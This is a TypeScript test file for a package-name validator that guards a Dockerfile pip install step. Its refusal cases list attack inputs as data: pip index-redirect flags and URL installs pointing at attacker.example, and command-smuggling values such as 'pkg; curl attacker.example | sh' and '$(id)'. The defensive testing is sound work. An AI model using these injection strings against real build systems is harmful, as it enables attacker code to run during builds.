/**
 * Tests for extra_packages validation.
 *
 * Run with: npm test
 *
 * These entries end up in a `RUN pip install` layer, and the spec they come from
 * is served by the harness service. The threat is flag smuggling, not shell
 * escaping: `--index-url` needs no metacharacters to redirect pip's resolver and
 * execute attacker code during the image build. The general SAFE allowlist
 * permits leading dashes because argv tokens need them, which is exactly why
 * package names get their own grammar.
 */

import assert from "node:assert/strict";
import { test } from "node:test";

import { assertPackageName } from "./render.ts";

test("ordinary package names pass", () => {
  for (const ok of ["hf_transfer", "hf-transfer", "numpy", "vllm", "a", "Pillow", "zope.interface"]) {
    assert.equal(assertPackageName(ok), ok);
  }
});

test("version specifiers and extras still work", () => {
  for (const ok of ["numpy==1.26.4", "vllm>=0.27.1", "torch~=2.5", "uvicorn[standard]", "pkg!=1.0"]) {
    assert.equal(assertPackageName(ok), ok);
  }
});

test("pip flags are refused", () => {
  // The actual attack: no shell metacharacters needed, just a flag.
  for (const attack of [
    "--index-url=http://attacker.example/simple",
    "--extra-index-url=http://attacker.example/simple",
    "--trusted-host=attacker.example",
    "-i",
    "--pre",
    "-e",
  ]) {
    assert.throws(
      () => assertPackageName(attack),
      /not a package name/,
      `must refuse ${attack}`,
    );
  }
});

test("paths, URLs and local installs are refused", () => {
  for (const attack of [
    "/etc/passwd",
    "./evil",
    "http://attacker.example/pkg.tar.gz",
    "git+https://attacker.example/repo",
    "pkg@http://attacker.example/x.whl",
  ]) {
    assert.throws(() => assertPackageName(attack), /not a package name/, `must refuse ${attack}`);
  }
});

test("shell metacharacters are refused", () => {
  // Belt and braces: the layer is a Dockerfile RUN line, so a semicolon would
  // otherwise chain a second command.
  for (const attack of ["pkg; curl attacker.example | sh", "pkg && whoami", "pkg`id`", "pkg$(id)", "pkg\nRUN evil"]) {
    assert.throws(() => assertPackageName(attack), /not a package name/, `must refuse ${attack}`);
  }
});

test("empty and whitespace entries are refused", () => {
  for (const bad of ["", " ", "  pkg", "pkg ", "two pkgs"]) {
    assert.throws(() => assertPackageName(bad), /not a package name/, `must refuse ${JSON.stringify(bad)}`);
  }
});
